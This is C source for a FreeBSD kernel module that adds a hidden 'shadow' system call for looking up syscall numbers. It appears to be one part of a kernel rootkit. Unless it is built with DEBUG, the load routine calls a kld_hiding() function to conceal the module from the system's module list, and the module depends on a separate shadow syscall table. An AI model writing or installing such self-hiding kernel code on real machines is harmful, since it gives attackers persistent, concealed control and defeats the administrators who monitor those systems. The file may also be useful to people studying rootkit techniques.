#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/sysproto.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include "kld_hiding.h"
#include "shadow_sysent.h"

#define KLD_NAME T_NAME"_shdw_lookup"
#define KLD_FILE_NAME T_NAME"_shdw_lookup.ko"

struct shdw_lookup_args {
   int index;         // shadow sysent table index
   int * syscall_num; // syscall number return value
};

/* A system call to look up the system call number for the given shadow
 * sysent table index.
 */
static int shdw_lookup(struct thread *td, void *syscall_args) {
   int error = 0;
   struct shdw_lookup_args *uap;
   uap = (struct shdw_lookup_args *)syscall_args;
   int index = uap->index;

   if (index < 0 || index >= MAX_SHADOWS) {
      error = -1;
      error = copyout(&error, uap->syscall_num, sizeof(int));
   } else {
      error = copyout(&(shadow_sysent[index].syscall_num),
         uap->syscall_num, sizeof(int));
   }

   return(error);
}

/* The sysent for the new system call. */
static struct sysent shdw_lookup_sysent = {
   2,
   shdw_lookup     // implementing function
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif
   int error = 0;
   int syscall_num = offset;

   switch (cmd) {
      case MOD_LOAD:
         INSERT_SHADOW_ENTRY(LOOKUP_INDEX, shdw_lookup, syscall_num);
#ifdef DEBUG
         uprintf("[-] shdw_lookup module loaded at sys call num %d\n", syscall_num);
#endif
         break;
      case MOD_UNLOAD:
         UNDO_SHADOW_ENTRY(LOOKUP_INDEX);
#ifdef DEBUG
         uprintf("[-] shdw_lookup module unloaded from sys call num %d\n", syscall_num);
#endif
         break;
      default:
         error = EOPNOTSUPP;
         break;
   }

   return (error);
}

MODULE_VERSION(shdw_lookup, 1);
SYSCALL_MODULE(shdw_lookup, &offset, &shdw_lookup_sysent, load, NULL);
MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
